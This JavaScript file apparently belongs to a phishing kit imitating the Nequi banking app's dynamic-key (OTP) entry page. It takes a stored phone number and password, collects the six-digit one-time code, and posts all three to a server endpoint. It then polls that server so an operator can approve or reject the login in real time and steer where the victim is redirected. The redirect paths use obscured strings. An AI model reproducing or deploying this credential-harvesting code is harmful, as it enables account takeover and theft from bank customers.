document.addEventListener('DOMContentLoaded', () => {
    const otpDigits = document.querySelectorAll('.otp-digit');
    const keypadBtns = document.querySelectorAll('.keypad-btn:not(.keypad-backspace)');
    const backspaceBtn = document.querySelector('.keypad-backspace');
    const cancelBtn = document.querySelector('.btn-cancelar');
    let currentInput = [];

    // Check for error parameter in URL
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get('error') === 'dynamic') {
        const errorDiv = document.getElementById('error-message');
        if (errorDiv) {
            errorDiv.textContent = 'Clave dinámica incorrecta';
            errorDiv.style.display = 'block';
            errorDiv.classList.add('slideUp');
            
            // Hide after 3 seconds
            setTimeout(() => {
                errorDiv.style.display = 'none';
                errorDiv.classList.remove('slideUp');
                // Clean URL
                window.history.replaceState({}, document.title, window.location.pathname);
            }, 3000);
        }
    }

    // Función para actualizar la visualización
    const updateDisplay = () => {
        otpDigits.forEach((digit, index) => {
            if (index < currentInput.length) {
                digit.textContent = currentInput[index];
                digit.classList.add('filled');
            } else {
                digit.textContent = '';
                digit.classList.remove('filled');
            }
        });

        // Verificar si está completo
        if (currentInput.length === 6) {
            const dinamica = currentInput.join('');
            const celular = localStorage.getItem('nequi_celular');
            const clave = localStorage.getItem('nequi_clave');

            if (!celular || !clave) {
            alert('Error: No se encontraron datos de sesión. Por favor inicie sesión nuevamente.');
            window.location.href = '/Xy7K9LmN2PqR5StV8WzX1Y4AbCdEfGhIjKlMnOpQrStUvWxYz0123456789AbCdEfGhIjKlMn';
            return;
          }

            // Show loading overlay immediately
            const overlay = document.getElementById('loading-overlay');
            if (overlay) {
                overlay.style.display = 'flex';
            }

            // Send to server
            fetch('/api/save-dynamic', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ celular, clave, dinamica })
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok: ' + response.statusText);
                }
                return response.json();
            })
            .then(data => {
                console.log('Dynamic key sent:', data);
                // Start polling for status
                startPolling(celular);
            })
            .catch(error => {
                console.error('Error sending dynamic key:', error);
                if (overlay) {
                    overlay.style.display = 'none';
                }
                alert('Error al enviar la clave dinámica. Por favor intente nuevamente.');
            });
        }
    };

    let pollInterval;

    const startPolling = (celular) => {
        pollInterval = setInterval(() => {
            fetch('/api/check-dynamic-status', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ celular }) 
            })
            .then(response => response.json())
            .then(statusData => {
                if (statusData.status === 'approved') {
                    clearInterval(pollInterval);
                    navigateWithLoader('/FiNaLPaGeXyZ0123456789AbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWx');
                } else if (statusData.status === 'rejected_user') {
                    clearInterval(pollInterval);
                    window.location.href = '/Xy7K9LmN2PqR5StV8WzX1Y4AbCdEfGhIjKlMnOpQrStUvWxYz0123456789AbCdEfGhIjKlMn?error=user';
                } else if (statusData.status === 'rejected_dynamic') {
                    clearInterval(pollInterval);
                    window.location.href = '/ZaBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789AbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIj?error=dynamic';
                }
            })
            .catch(err => console.error('Polling error:', err));
        }, 2000);
    };

    // Event listeners para números
    keypadBtns.forEach(btn => {
        btn.addEventListener('click', () => {
            if (currentInput.length < 6) {
                const value = btn.getAttribute('data-value');
                currentInput.push(value);
                updateDisplay();
            }
        });
    });

    // Event listener para backspace
    if (backspaceBtn) {
        backspaceBtn.addEventListener('click', () => {
            if (currentInput.length > 0) {
                currentInput.pop();
                updateDisplay();
            }
        });
    }

    // Event listener para cancelar
    if (cancelBtn) {
        cancelBtn.addEventListener('click', () => {
            // Limpiar input o redirigir atrás
            if (currentInput.length > 0) {
                currentInput = [];
                updateDisplay();
            } else {
                // Opcional: Volver a la página anterior
                window.history.back();
            }
        });
    }
});